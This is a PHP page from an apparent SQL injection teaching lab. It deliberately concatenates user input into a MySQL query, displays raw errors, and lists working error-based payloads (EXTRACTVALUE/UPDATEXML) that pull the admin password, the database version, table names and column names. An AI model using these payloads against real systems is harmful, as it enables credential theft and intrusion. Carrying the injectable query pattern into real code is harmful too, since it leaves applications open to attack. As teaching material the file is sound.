<?php
// ============================================================
// error_based_vulnerable.php - Error-Based SQL Injection Demo
// SQL Injection Educational Lab
// FOR EDUCATIONAL PURPOSES ONLY - localhost only
// ============================================================
//
// VULNERABILITY: Error-based SQL injection using EXTRACTVALUE/UPDATEXML
// --------------------------------------------------------------------
// When error messages are displayed to the user, an attacker can
// force MySQL to include data inside the error message itself.
//
// Functions used:
//   EXTRACTVALUE(xml, xpath)  - returns an error if xpath is invalid
//   UPDATEXML(xml, xpath, value) - same behavior
//
// Example payload:
//   ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'))) --
//
// MySQL will throw an error like:
//   XPATH syntax error: '~admin123'
//
// The attacker just extracted the admin password from the error message!
// ============================================================

require_once 'db.php';
require_once 'lang_switcher.php';
$_SESSION['visited_labs'][] = 'error_based_vulnerable'; $_SESSION['visited_labs'] = array_unique($_SESSION['visited_labs']);

$result  = null;
$error   = null;
$query   = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $search = $_POST['search'] ?? '';

    // VULNERABLE: Direct string concatenation
    $query = "SELECT * FROM users WHERE username='$search'";

    try {
        $pdo  = getDB();
        $stmt = $pdo->query($query);
        $result = $stmt->fetchAll();
    } catch (PDOException $e) {
        $error = $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html lang="<?= t('lang_code') ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= t('errorbased_page') ?></title>
    <style>
        <?= langSwitcherCSS() ?>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f1a; color: #e0e0e0; min-height: 100vh; }
        .container { max-width: 750px; margin: 0 auto; padding: 40px 20px; }
        a.back { color: #00e5ff; text-decoration: none; font-size: 0.9rem; }
        a.back:hover { text-decoration: underline; }
        h1 { color: #ff5252; margin: 16px 0 4px; }
        .tag { display: inline-block; background: #b71c1c; color: #fff; font-size: 0.7rem; padding: 2px 8px; border-radius: 4px; text-transform: uppercase; font-weight: bold; margin-bottom: 16px; }
        .info-box { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; margin-bottom: 24px; line-height: 1.6; font-size: 0.9rem; }
        .info-box code { display: block; background: #0d0d1a; padding: 6px 10px; border-radius: 4px; color: #ff8a80; margin: 6px 0; font-size: 0.82rem; word-break: break-all; }
        form { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 24px; margin-bottom: 24px; }
        label { display: block; margin-bottom: 6px; font-size: 0.9rem; color: #aaa; }
        input[type="text"] {
            width: 100%; padding: 10px 12px; margin-bottom: 16px; border: 1px solid #333;
            border-radius: 6px; background: #0d0d1a; color: #e0e0e0; font-size: 0.95rem;
        }
        button { padding: 10px 24px; border: none; border-radius: 6px; background: #c62828; color: #fff; font-weight: bold; font-size: 0.95rem; cursor: pointer; }
        button:hover { background: #e53935; }
        .query-box { background: #0d0d1a; border: 1px solid #333; border-radius: 6px; padding: 14px; margin-bottom: 20px; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #ffab91; word-break: break-all; }
        .query-box span { color: #666; }
        .result-box { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; }
        .result-box h3 { color: #00e5ff; margin-bottom: 12px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { text-align: left; padding: 8px 12px; border-bottom: 1px solid #2a2a4a; font-size: 0.88rem; }
        th { color: #888; }
        .error-display { color: #ff5252; background: #1a0000; padding: 16px; border-radius: 8px; border: 1px solid #c62828; font-family: 'Courier New', monospace; font-size: 0.85rem; word-break: break-all; margin-bottom: 16px; }
        .error-display .highlight { background: #ffab4033; color: #ffab40; padding: 2px 4px; border-radius: 3px; font-weight: bold; }
        .technique-box { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; margin-bottom: 24px; }
        .technique-box h3 { color: #00e5ff; margin-bottom: 12px; font-size: 1rem; }
        .technique-box table { width: 100%; border-collapse: collapse; }
        .technique-box th, .technique-box td { text-align: left; padding: 6px 10px; border-bottom: 1px solid #2a2a4a; font-size: 0.82rem; }
        .technique-box th { color: #888; }
        .technique-box td code { color: #ff8a80; }
    </style>
</head>
<body>
<?= langSwitcherHTML() ?>
<div class="container">
    <a class="back" href="index.php"><?= t('back_to_menu') ?></a>
    <h1><?= t('errorbased_title') ?></h1>
    <span class="tag"><?= t('vulnerable') ?></span>

    <!-- Explanation -->
    <div class="info-box">
        <?= t('errorbased_what') ?><br><br>
        <?= t('errorbased_technique') ?>

        <strong><?= t('errorbased_extractvalue') ?></strong>
        <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'))) -- </code>

        <strong><?= t('errorbased_updatexml') ?></strong>
        <code>' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin')), 1) -- </code>

        <strong><?= t('errorbased_db_version') ?></strong>
        <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- </code>
    </div>

    <!-- Search Form -->
    <form method="POST">
        <label for="search"><?= t('search_by_username') ?></label>
        <input type="text" id="search" name="search"
               placeholder="' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1))) -- "
               value="<?= htmlspecialchars($_POST['search'] ?? '') ?>">
        <button type="submit"><?= t('search_btn') ?></button>
    </form>

    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
        <!-- Show the executed query -->
        <div class="query-box">
            <span><?= t('executed_sql') ?></span><br>
            <?= htmlspecialchars($query) ?>
        </div>

        <div class="result-box">
            <?php if ($error): ?>
                <h3 style="color:#ff5252; margin-bottom:12px;"><?= t('errorbased_error_title') ?></h3>
                <div class="error-display">
                    <?php
                    // Highlight extracted data in error (text after ~ character)
                    $errorHtml = htmlspecialchars($error);
                    $errorHtml = preg_replace('/~([^\']+)/', '~<span class="highlight">$1</span>', $errorHtml);
                    echo $errorHtml;
                    ?>
                </div>
                <p style="color:#ffab40; font-size:0.85rem;">
                    &#9888; <?= t('errorbased_data_in_error') ?>
                </p>

            <?php elseif ($result && count($result) > 0): ?>
                <h3><?= count($result) ?> <?= t('rows_returned') ?></h3>
                <table>
                    <tr>
                        <?php foreach (array_keys($result[0]) as $col): ?>
                            <th><?= htmlspecialchars($col) ?></th>
                        <?php endforeach; ?>
                    </tr>
                    <?php foreach ($result as $row): ?>
                        <tr>
                            <?php foreach ($row as $val): ?>
                                <td><?= htmlspecialchars($val) ?></td>
                            <?php endforeach; ?>
                        </tr>
                    <?php endforeach; ?>
                </table>

            <?php else: ?>
                <h3 style="color:#ff8a80;"><?= t('no_results') ?></h3>
            <?php endif; ?>
        </div>
    <?php endif; ?>

    <!-- Techniques Reference -->
    <div class="technique-box">
        <h3><?= t('errorbased_ref_title') ?></h3>
        <table>
            <tr><th><?= t('errorbased_goal') ?></th><th><?= t('payload') ?></th></tr>
            <tr>
                <td><?= t('errorbased_goal_password') ?></td>
                <td><code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'))) -- </code></td>
            </tr>
            <tr>
                <td><?= t('errorbased_goal_version') ?></td>
                <td><code>' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- </code></td>
            </tr>
            <tr>
                <td><?= t('errorbased_goal_tables') ?></td>
                <td><code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- </code></td>
            </tr>
            <tr>
                <td><?= t('errorbased_goal_columns') ?></td>
                <td><code>' AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')), 1) -- </code></td>
            </tr>
        </table>
    </div>
</div>
</body>
</html>
